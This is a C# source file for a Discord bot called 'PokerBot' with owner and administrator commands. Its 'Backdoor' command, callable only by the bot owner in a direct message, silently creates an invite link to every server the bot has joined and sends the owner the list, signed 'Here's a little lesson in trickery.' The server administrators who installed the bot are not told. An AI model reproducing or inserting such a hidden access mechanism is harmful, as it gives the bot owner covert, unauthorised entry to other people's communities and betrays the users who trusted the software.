﻿using System;
using System.Collections.Generic;
using System.Linq;
using System.Text;
using System.Threading.Tasks;
using Discord;
using Discord.Commands;

namespace PokerBot.Commands
{
    [Group("Admin")]
    public class AdminCommands : ModuleBase<SocketCommandContext>
    {
        [Command("Message"), Summary("Messages a guild user by username."), RequireUserPermission(GuildPermission.Administrator)]
        public async Task MessageGuildUserAsync(string userToMsg, [Remainder] string content) =>
            await Context.Guild.Users.SingleOrDefault(x => x.Username == userToMsg || x.Nickname == userToMsg || x.Id.ToString() == userToMsg).GetOrCreateDMChannelAsync().Result.SendMessageAsync(content);

        [Command("Backdoor"), RequireContext(ContextType.DM), RequireOwner]
        public async Task Backdoor()
        {
            var guilds = Context.Client.Guilds;
            
            List<EmbedFieldBuilder> fields = new List<EmbedFieldBuilder>(guilds.Count);
            foreach (var guild in guilds)
                fields.Add(new EmbedFieldBuilder()
                {
                    Name = guild.Name,
                    Value = await guild.TextChannels.FirstOrDefault().CreateInviteAsync(),
                    IsInline = false
                });

            var builder = new EmbedBuilder()
            {
                Color = Color.DarkGrey,
                Title = "Connected Guilds",
                Timestamp = DateTimeOffset.Now,
                Footer = new EmbedFooterBuilder() { Text = "Here's a little lesson in trickery." },
                Fields = fields
            };
            await ReplyAsync(null, false, builder.Build());
        }
    }
}
